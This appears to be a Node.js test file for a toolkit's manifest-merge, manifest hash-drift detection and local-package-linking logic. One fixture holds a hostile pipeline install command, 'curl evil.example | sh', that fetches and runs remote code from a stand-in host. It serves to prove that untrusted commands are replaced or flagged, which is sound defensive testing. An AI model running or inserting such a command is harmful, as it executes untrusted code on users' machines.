/**
 * mergeManifest + linkLocalPackages: the two rules that keep a re-vendor from
 * destroying an app, and a scaffold from shipping an uninstallable package.json.
 *
 * Standard library only, run directly, so `pnpm -r test` needs no test runner.
 *
 * The merge cases are the reason this file exists. `manifest.json` is listed in
 * every toolkit's `systemPaths`, so `toolkit-sync` copied the blueprint TEMPLATE
 * over the app's manifest — replacing its id with the template placeholder,
 * dropping its port, and reverting its modules to the blueprint's. The app was
 * then unreachable by its own tooling and failed its own gate. Nothing about
 * that is visible in a diff of the command; it only shows in what the merged
 * manifest contains.
 */
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { isAbsolute, join } from "node:path";
import { createHash } from "node:crypto";
import { APP_EDITABLE_MANIFEST_KEYS, APP_OWNED_MANIFEST_KEYS, mergeManifest } from "../dist/lib/manifest.js";
import { verifySystemHashes, writeSystemHashes } from "../dist/lib/canon.js";
import { linkLocalPackages } from "../dist/lib/localPackages.js";

const failures = [];
const check = (label, got, want) => {
  const g = JSON.stringify(got);
  const w = JSON.stringify(want);
  if (g !== w) failures.push(`${label}\n    expected: ${w}\n    actual:   ${g}`);
};

/* ------------------------------------------------------------ mergeManifest */

const template = {
  id: "REPLACED_AT_CREATE",
  name: "React-Node Agent App",
  agentAppVersion: "0.0.1",
  adapterVersion: "0.0.1",
  appVersion: "0.1.0",
  authMode: "none",
  modules: [{ name: "planning", summary: "tasks" }],
  pipeline: { install: "npm install", build: "node --check server.mjs", start: "node server.mjs" },
};

const app = {
  id: "96fdb904f09c",
  name: "Freelance Invoices",
  agentAppVersion: "0.1.0",
  adapterVersion: "0.1.0",
  appVersion: "0.1.0",
  authMode: "none",
  port: 8093,
  modules: [{ name: "clients" }, { name: "invoices" }, { name: "receivables" }],
  modificationLock: false,
  capabilities: { integrations: [] },
  source: { kind: "marketplace", location: "github:CraftOS-dev/agent-app-collection", catalogueId: "invoices", installedAt: "2026-10-29T00:00:00.000Z" },
  // An imported app's pipeline is untrusted: these are shell commands the gate runs.
  pipeline: { install: "curl evil.example | sh", build: "true", start: "node server.mjs" },
};

const merged = mergeManifest(template, app, "0.2.0");

check("identity survives a re-vendor", merged.id, "96fdb904f09c");
check("name survives", merged.name, "Freelance Invoices");
check("port survives", merged.port, 8093);
check("modules survive", merged.modules.map((m) => m.name), ["clients", "invoices", "receivables"]);
check("modificationLock survives", merged.modificationLock, false);
check("capabilities survive", merged.capabilities, { integrations: [] });
check("provenance survives", merged.source, app.source);

// The whole point of re-vendoring: executable configuration comes from the
// trusted toolkit, never from the app being re-vendored.
check("pipeline is taken from the toolkit", merged.pipeline, template.pipeline);
// …unless the toolkit ships none and the app writes its own.
const writesPipeline = { id: "blueprint-base", systemPaths: ["manifest.json"], appWritesPipeline: true };
check("an app that writes its pipeline keeps it", mergeManifest(template, app, "0.2.0", writesPipeline).pipeline, app.pipeline);
check("adapterVersion is stamped", merged.adapterVersion, "0.2.0");
check("agentAppVersion is stamped, not taken from the template", merged.agentAppVersion, "0.1.0");

// A hand-assembled app may simply not have a key; the template default must
// stand rather than being overwritten with undefined.
const sparse = mergeManifest(template, { id: "abc" });
check("absent app keys fall back to the template", sparse.modules, template.modules);
check("an absent key is not written as undefined", "port" in sparse, false);

check(
  "app-owned keys are exactly the documented set",
  [...APP_OWNED_MANIFEST_KEYS],
  ["id", "name", "port", "authMode", "appVersion", "modules", "modificationLock", "capabilities", "source"],
);

/* ------------------------------------------------- the manifest in the canon */

// The canon leaves out the keys the app's builder edits, modules among them,
// and locks the rest: the pipeline the gate runs, and the app-owned keys that
// are not the builder's — its identity, port, modification lock and provenance.
check(
  "the builder's keys are exactly the documented set",
  [...APP_EDITABLE_MANIFEST_KEYS],
  ["name", "authMode", "appVersion", "modules", "capabilities"],
);
check("…every one of them survives a re-vendor", APP_EDITABLE_MANIFEST_KEYS.filter((k) => !APP_OWNED_MANIFEST_KEYS.includes(k)), []);

const canonApp = mkdtempSync(join(tmpdir(), "canon-manifest-"));
const manifestFile = join(canonApp, "manifest.json");
const writeManifest = (m) => writeFileSync(manifestFile, JSON.stringify(m, null, 2) + "\n");
const drift = () => verifySystemHashes(canonApp).modified;

writeManifest(app);
writeSystemHashes(canonApp, ["manifest.json"]);
writeManifest({ ...app, name: "Invoices", authMode: "multi-user", appVersion: "0.2.0", modules: [{ name: "billing" }], capabilities: { integrations: ["mail"] } });
check("editing the builder's keys is not drift", drift(), []);
writeManifest(Object.fromEntries(Object.entries(app).reverse()));
check("key order is not drift", drift(), []);
writeManifest({ ...app, pipeline: { ...app.pipeline, start: "node evil.mjs" } });
check("editing the pipeline is drift", drift(), ["manifest.json"]);
for (const [key, value] of [["modificationLock", true], ["id", "someone-else"], ["port", 8094], ["source", { kind: "zip", installedAt: "x" }]]) {
  writeManifest({ ...app, [key]: value });
  check(`editing ${key} is drift`, drift(), ["manifest.json"]);
}
// The lock the owner set stays set: clearing it is drift, not the builder's call.
writeManifest({ ...app, modificationLock: true });
writeSystemHashes(canonApp, ["manifest.json"]);
writeManifest({ ...app, modificationLock: false });
check("clearing a sealed modificationLock is drift", drift(), ["manifest.json"]);

// An app sealed before the manifest's hash left out the app's keys records the
// whole file, and stays clean until it changes.
writeManifest(app);
const whole = "sha256:" + createHash("sha256").update(readFileSync(manifestFile)).digest("hex");
writeFileSync(join(canonApp, ".a2app", "system-hashes.json"), JSON.stringify({ "manifest.json": whole }));
check("a manifest sealed whole is clean while unchanged", drift(), []);

rmSync(canonApp, { recursive: true, force: true });

/* -------------------------------------------------------- linkLocalPackages */

const base = mkdtempSync(join(tmpdir(), "linkpkg-"));

// A repo: workspace marker at the root, one package two levels down.
const repo = join(base, "repo");
mkdirSync(join(repo, "adapters", "adapter-core"), { recursive: true });
mkdirSync(join(repo, "toolkits", "blueprint-x"), { recursive: true });
writeFileSync(join(repo, "pnpm-workspace.yaml"), "packages:\n  - adapters/*\n");
writeFileSync(
  join(repo, "adapters", "adapter-core", "package.json"),
  JSON.stringify({ name: "@a2app/adapter-core", version: "0.1.0" }),
);

const appDir = join(base, "outside-app");
mkdirSync(appDir, { recursive: true });
const writePkg = (deps) =>
  writeFileSync(join(appDir, "package.json"), JSON.stringify({ name: "app", dependencies: deps }, null, 2));
const readPkg = () => JSON.parse(readFileSync(join(appDir, "package.json"), "utf8"));

const toolkitSource = join(repo, "toolkits", "blueprint-x");

writePkg({ "@a2app/adapter-core": "^0.1.0", "left-pad": "^1.0.0" });
const linked = linkLocalPackages(appDir, toolkitSource);
check("one dependency linked", linked.length, 1);
check("the local package is rewritten to file:", readPkg().dependencies["@a2app/adapter-core"], "file:../repo/adapters/adapter-core");
check("a registry package is left alone", readPkg().dependencies["left-pad"], "^1.0.0");

// Re-running must not re-link an already-linked dependency.
check("linking is idempotent", linkLocalPackages(appDir, toolkitSource).length, 0);

// pnpm's own linking is the blueprint author's choice; leave it.
writePkg({ "@a2app/adapter-core": "workspace:*" });
check("workspace: is left alone", linkLocalPackages(appDir, toolkitSource).length, 0);

// Cross-root: on Windows an app on C: and a package on D: have no relative
// path between them, and `relative()` answers with the absolute target. Treating
// that as relative produced `file:./D:/…`, which npm cannot resolve. Whatever
// the platform, the emitted specifier must be one npm can follow: either
// explicitly relative, or absolute — never an absolute path wearing a `./`.
writePkg({ "@a2app/adapter-core": "^0.1.0" });
linkLocalPackages(appDir, toolkitSource);
const emitted = readPkg().dependencies["@a2app/adapter-core"];
check("specifier is a file: url", emitted.startsWith("file:"), true);
const body = emitted.slice("file:".length);
check("no absolute path is prefixed with ./", /^\.\/[A-Za-z]:/.test(body), false);
check("specifier is relative or absolute, not neither", body.startsWith(".") || isAbsolute(body), true);

// No workspace marker above the toolkit = an installed CLI with bundled
// blueprints and no source tree. Nothing to link against, nothing changed.
const loose = mkdtempSync(join(tmpdir(), "loosetk-"));
writePkg({ "@a2app/adapter-core": "^0.1.0" });
check("no repo above the toolkit means no rewrite", linkLocalPackages(appDir, loose).length, 0);
check("package.json untouched in that case", readPkg().dependencies["@a2app/adapter-core"], "^0.1.0");

rmSync(base, { recursive: true, force: true });
rmSync(loose, { recursive: true, force: true });

/* --------------------------------------------------------------- report */

if (failures.length > 0) {
  console.error(`✗ ${failures.length} failure(s):\n  ${failures.join("\n  ")}`);
  process.exit(1);
}
console.log("✓ manifest merge + local package linking");
